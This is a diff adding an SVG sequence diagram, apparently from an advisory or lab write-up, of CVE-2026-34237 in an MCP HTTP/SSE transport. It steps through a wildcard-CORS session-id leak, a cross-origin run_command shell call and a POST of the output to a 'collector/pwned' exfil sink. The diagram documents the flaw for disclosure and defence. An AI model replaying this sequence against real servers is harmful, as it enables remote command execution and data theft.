@@ -1,0 +1,94 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 980 700" font-family="ui-sans-serif, system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial, sans-serif" role="img" aria-label="CVE-2026-34237 HTTP/SSE attack sequence">
+  <title>CVE-2026-34237 - HTTP/SSE attack sequence</title>
+
+  <rect x="0" y="0" width="980" height="700" rx="14" fill="#f6f8fa"/>
+  <rect x="0.5" y="0.5" width="979" height="699" rx="14" fill="none" stroke="#d0d7de"/>
+
+  <defs>
+    <marker id="s_red" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7.5" markerHeight="7.5" orient="auto-start-reverse">
+      <path d="M0,0 L10,5 L0,10 z" fill="#cf222e"/>
+    </marker>
+    <marker id="s_gray" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse">
+      <path d="M0,0 L10,5 L0,10 z" fill="#57606a"/>
+    </marker>
+  </defs>
+
+  <text x="30" y="40" font-size="20" font-weight="700" fill="#1f2328">Attack sequence - MCP HTTP/SSE transport</text>
+  <text x="30" y="61" font-size="13" fill="#57606a">CVE-2026-34237 . both request types are CORS-simple, so no preflight is involved</text>
+
+  <!-- lifelines -->
+  <!-- x: page=120  transport=440  shell=690  collector=890 -->
+  <line x1="120" y1="120" x2="120" y2="646" stroke="#8250df" stroke-width="1.2" stroke-dasharray="4 4"/>
+  <line x1="440" y1="120" x2="440" y2="646" stroke="#cf222e" stroke-width="1.2" stroke-dasharray="4 4"/>
+  <line x1="690" y1="120" x2="690" y2="646" stroke="#57606a" stroke-width="1.2" stroke-dasharray="4 4"/>
+  <line x1="890" y1="120" x2="890" y2="646" stroke="#57606a" stroke-width="1.2" stroke-dasharray="4 4"/>
+
+  <!-- actor heads -->
+  <rect x="40" y="84" width="160" height="40" rx="8" fill="#fff5f5" stroke="#cf222e"/>
+  <text x="120" y="101" font-size="12" font-weight="700" fill="#1f2328" text-anchor="middle">Attacker page</text>
+  <text x="120" y="116" font-size="9.5" fill="#57606a" text-anchor="middle">attacker.lab.consulereit.nl</text>
+
+  <rect x="352" y="84" width="176" height="40" rx="8" fill="#fff5f5" stroke="#cf222e"/>
+  <text x="440" y="102" font-size="12" font-weight="700" fill="#1f2328" text-anchor="middle">MCP HTTP/SSE transport</text>
+  <text x="440" y="117" font-size="10.5" fill="#57606a" text-anchor="middle">Meridian CI . mcp-core 1.0.0</text>
+
+  <rect x="622" y="84" width="136" height="40" rx="8" fill="#ffffff" stroke="#d0d7de"/>
+  <text x="690" y="102" font-size="12" font-weight="700" fill="#1f2328" text-anchor="middle">run_command</text>
+  <text x="690" y="117" font-size="10.5" fill="#57606a" text-anchor="middle">/bin/sh -c ...</text>
+
+  <rect x="820" y="84" width="140" height="40" rx="8" fill="#ffffff" stroke="#d0d7de"/>
+  <text x="890" y="102" font-size="12" font-weight="700" fill="#1f2328" text-anchor="middle">collector</text>
+  <text x="890" y="117" font-size="10.5" fill="#57606a" text-anchor="middle">exfil sink</text>
+
+  <!-- activation bar on transport -->
+  <rect x="434" y="150" width="12" height="404" fill="#ffe3e3" stroke="#cf222e" stroke-width="0.8"/>
+
+  <!-- 1 GET /mcp/sse -->
+  <text x="122" y="164" font-size="11.5" font-weight="600" fill="#cf222e">1  GET /mcp/sse   Origin: https://attacker.lab.consulereit.nl</text>
+  <line x1="120" y1="172" x2="432" y2="172" stroke="#cf222e" stroke-width="1.7" marker-end="url(#s_red)"/>
+  <text x="126" y="186" font-size="10" fill="#57606a">CORS-simple GET via EventSource</text>
+
+  <!-- 2 200 ACAO:* -->
+  <text x="436" y="208" font-size="11.5" font-weight="600" fill="#cf222e" text-anchor="end">2  200  Access-Control-Allow-Origin: *</text>
+  <line x1="440" y1="216" x2="122" y2="216" stroke="#cf222e" stroke-width="1.7" stroke-dasharray="6 3" marker-end="url(#s_red)"/>
+
+  <!-- 3 endpoint event -->
+  <text x="436" y="242" font-size="11.5" font-weight="600" fill="#cf222e" text-anchor="end">3  event: endpoint  data: /mcp/message?sessionId=UUID</text>
+  <line x1="440" y1="250" x2="122" y2="250" stroke="#cf222e" stroke-width="1.7" stroke-dasharray="6 3" marker-end="url(#s_red)"/>
+  <text x="436" y="266" font-size="10" fill="#cf222e" text-anchor="end">session id disclosed - readable cross-origin because of ACAO:*</text>
+
+  <!-- 4 POST initialize -->
+  <text x="122" y="300" font-size="11.5" font-weight="600" fill="#cf222e">4  POST /mcp/message?sessionId=UUID   {initialize}</text>
+  <line x1="120" y1="308" x2="432" y2="308" stroke="#cf222e" stroke-width="1.7" marker-end="url(#s_red)"/>
+  <text x="126" y="322" font-size="10" fill="#57606a">Content-Type: text/plain - CORS-simple, no preflight</text>
+
+  <!-- 5 SSE initialize result -->
+  <text x="436" y="344" font-size="11.5" fill="#57606a" text-anchor="end">5  [SSE] message: initialize result</text>
+  <line x1="440" y1="352" x2="122" y2="352" stroke="#57606a" stroke-width="1.5" stroke-dasharray="6 3" marker-end="url(#s_gray)"/>
+
+  <!-- 6 tools/call run_command -->
+  <text x="122" y="388" font-size="11.5" font-weight="600" fill="#cf222e">6  POST ...   {tools/call run_command, cmd: canary}</text>
+  <line x1="120" y1="396" x2="432" y2="396" stroke="#cf222e" stroke-width="1.7" marker-end="url(#s_red)"/>
+
+  <!-- 7 transport -> shell exec -->
+  <text x="446" y="428" font-size="11.5" font-weight="600" fill="#1f2328">7  exec: /bin/sh -c "id; hostname; echo LAB_CANARY"</text>
+  <line x1="446" y1="436" x2="682" y2="436" stroke="#57606a" stroke-width="1.6" marker-end="url(#s_gray)"/>
+  <rect x="684" y="436" width="12" height="40" fill="#eaeef2" stroke="#57606a" stroke-width="0.8"/>
+
+  <!-- 8 shell -> transport output -->
+  <text x="682" y="494" font-size="11.5" fill="#57606a" text-anchor="end">8  canary output</text>
+  <line x1="684" y1="484" x2="448" y2="484" stroke="#57606a" stroke-width="1.5" stroke-dasharray="6 3" marker-end="url(#s_gray)"/>
+
+  <!-- 9 SSE tools/call result -->
+  <text x="436" y="522" font-size="11.5" font-weight="600" fill="#cf222e" text-anchor="end">9  [SSE] message: tools/call result (LAB_CANARY output)</text>
+  <line x1="440" y1="530" x2="122" y2="530" stroke="#cf222e" stroke-width="1.7" stroke-dasharray="6 3" marker-end="url(#s_red)"/>
+
+  <!-- 10 exfil to collector -->
+  <text x="122" y="584" font-size="11.5" font-weight="600" fill="#cf222e">10  POST http://collector/pwned   {module, sessionId, output}</text>
+  <line x1="120" y1="592" x2="882" y2="592" stroke="#cf222e" stroke-width="1.7" marker-end="url(#s_red)"/>
+
+  <!-- boundary / footnote -->
+  <line x1="30" y1="616" x2="950" y2="616" stroke="#d0d7de"/>
+  <text x="30" y="638" font-size="11" fill="#8250df" font-weight="600">Reading step 3 is stealing the session - MCP HTTP/SSE has no separate bearer credential. Patched SDK (1.0.1) drops step 2's wildcard header, so step 3 is never readable.</text>
+  <text x="30" y="662" font-size="11" fill="#57606a">Isolated lab VM . labnet internal: true (no egress) . benign canary only (SCOPE #4)</text>
+</svg>
